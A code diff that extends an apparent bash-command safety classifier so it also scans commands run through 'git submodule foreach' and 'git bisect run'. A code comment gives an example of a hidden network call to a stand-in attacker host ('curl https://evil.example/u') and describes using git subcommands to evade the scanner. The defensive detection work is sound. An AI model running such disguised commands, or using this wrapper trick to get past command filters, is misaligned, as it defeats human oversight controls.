@@ -183,23 +183,48 @@ function extractEvalArguments(command: string): string[] {
   return results;
 }
 
+// `git submodule foreach <cmd…>` / `git bisect run <cmd…>`: the tail after
+// the subcommand is itself a command invocation of its own, e.g.
+// `git submodule foreach curl https://evil.example/u`. `git` stays excluded
+// from the generic unknown-wrapper network scan in classify-bash.ts (a
+// commit message or `--grep` argument can legitimately contain a network
+// word), so without this extraction a network command hiding behind either
+// of these two subcommands would never be seen. Like the `eval` extractor,
+// the (unquoted) tail runs up to the next chain/pipe delimiter.
+const GIT_FOREACH_OR_BISECT_RUN = /\bgit\s+(?:submodule\s+foreach|bisect\s+run)\s+/g;
+
+function extractGitForeachOrBisectRunCommands(command: string): string[] {
+  const results: string[] = [];
+  GIT_FOREACH_OR_BISECT_RUN.lastIndex = 0;
+  let match: RegExpExecArray | null;
+  while ((match = GIT_FOREACH_OR_BISECT_RUN.exec(command)) !== null) {
+    const rest = command.slice(match.index + match[0].length);
+    const stop = rest.search(/[;\n|&]/);
+    results.push(stop === -1 ? rest : rest.slice(0, stop));
+  }
+  return results;
+}
+
 /**
  * Splits a raw command into segments: top-level pipeline/chain segments plus
  * the (further-split) inner text of any process/command substitutions,
  * backtick expressions, `sh -c '...'` string bodies, `find -exec ... \;`
- * commands and `eval <arg>` arguments found anywhere in the command.
+ * commands, `eval <arg>` arguments and `git submodule foreach <cmd>` /
+ * `git bisect run <cmd>` tails found anywhere in the command.
  */
 export function splitSegments(command: string): string[] {
   const substitutions = extractSubstitutions(command).flatMap(splitTop);
   const shCStrings = extractShCStrings(command).flatMap(splitTop);
   const findExecCommands = extractFindExecCommands(command).flatMap(splitTop);
   const evalArguments = extractEvalArguments(command).flatMap(splitTop);
+  const gitForeachOrBisectRun = extractGitForeachOrBisectRunCommands(command).flatMap(splitTop);
   return [
     ...splitTop(command),
     ...substitutions,
     ...shCStrings,
     ...findExecCommands,
     ...evalArguments,
+    ...gitForeachOrBisectRun,
   ];
 }
 
